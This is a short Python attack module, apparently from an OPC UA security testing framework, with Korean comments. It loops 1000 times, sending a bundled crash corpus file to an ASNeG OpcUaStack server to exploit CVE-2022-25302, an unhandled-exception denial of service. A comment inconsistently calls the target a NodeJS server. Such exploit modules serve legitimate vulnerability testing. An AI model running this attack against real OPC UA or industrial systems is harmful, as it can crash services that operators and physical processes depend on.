# ASNeG OpcUaStack를 샘플 파일로 크래시 유도하기 - Unhandled Exception
#   샘플 corpus 파일을 이용해 비정상 종료를 발생시키는 공격.
#
# CVEs:
#   - CVE-2022-25302: https://security.snyk.io/vuln/SNYK-UNMANAGED-ASNEGOPCUASTACK-2988732
#   이 취약점은 ASNeG OPC UA Stack에서 unhandled exception을 발생시켜 서비스 중단을 유발하는 것으로 보고됨.

import time
import os
CURRENT_PATH = os.path.dirname(os.path.abspath(__file__))

from .opcua_message_file import attack_file

# corpus 파일을 사용하여 서버를 공격하는 함수
#   이 공격은 샘플 corpus 파일을 서버에 전송하여 NodeJS OPC UA 서버를 크래시시키는 것을 목표로 한다.
def attack(server_details):
    for i in range(1000):
        attack_file(
            server_details, 
            filepath_corpus=os.path.join(CURRENT_PATH, "examples/corpus_asneg_opcuastack_crash_unhandeld_exception.bin"), 
            num_requests=1
        )
